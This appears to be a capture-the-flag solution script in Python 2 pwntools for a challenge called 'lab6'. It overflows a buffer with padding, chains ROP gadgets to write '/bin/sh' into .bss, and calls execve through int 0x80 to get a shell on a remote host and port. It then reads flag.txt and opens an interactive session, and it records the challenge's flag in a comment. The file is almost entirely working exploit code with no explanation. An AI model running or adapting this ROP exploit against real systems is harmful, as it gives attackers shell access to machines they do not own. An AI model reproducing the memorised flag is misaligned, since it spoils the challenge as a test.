#!/usr/bin/env python2
# -*- coding: ascii -*-
from pwn import *

# AngelboyCTF{auFHG0x3cFVkkPYCkaus}

context.arch = 'i386'

e = ELF('./lab6')

host , port = '35.194.234.201' , 2116

y = remote( host , port )

pcpbr = 0x0806e851
pdpcpbr = 0x0806e850
pop_eax = 0x080bae06
pop_edx = 0x0806e82a
mv_edx_eax = 0x0809a15d
int_0x80 = 0x0806eeef

p = flat(
    'D' * 0x20,
    pop_eax,
    '/bin',
    pop_edx,
    e.bss() + 0x10,
    mv_edx_eax,
    pop_eax,
    '/sh\x00',
    pop_edx,
    e.bss() + 0x14,
    mv_edx_eax,
    pop_eax,
    0xb,
    pdpcpbr,
    0,
    0,
    e.bss() + 0x10,
    int_0x80
)

print len( p )

y.sendafter( ':' , p )

y.sendline( 'cat ./flag.txt' )

y.interactive()

